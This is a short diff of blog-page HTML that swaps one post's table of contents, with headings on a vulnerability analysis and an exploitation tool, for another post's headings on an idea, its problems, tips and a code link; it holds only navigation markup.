-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞解析："><span class="nav-number">1.</span> <span class="nav-text">漏洞解析：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#文件命名方式："><span class="nav-number">1.1.</span> <span class="nav-text">文件命名方式：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#一键化利用工具："><span class="nav-number">2.</span> <span class="nav-text">一键化利用工具：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件说明"><span class="nav-number">3.</span> <span class="nav-text">文件说明</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#下载地址："><span class="nav-number">4.</span> <span class="nav-text">下载地址：</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#起因"><span class="nav-number">1.</span> <span class="nav-text">起因</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#构思"><span class="nav-number">2.</span> <span class="nav-text">构思</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#问题"><span class="nav-number">3.</span> <span class="nav-text">问题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#小Tips"><span class="nav-number">4.</span> <span class="nav-text">小Tips</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#注意"><span class="nav-number">5.</span> <span class="nav-text">注意</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#测试展与地址"><span class="nav-number">6.</span> <span class="nav-text">测试展与地址</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#代码地址"><span class="nav-number">6.1.</span> <span class="nav-text">代码地址:</span></a></li></ol></li></ol></div>
             
 
           </div>
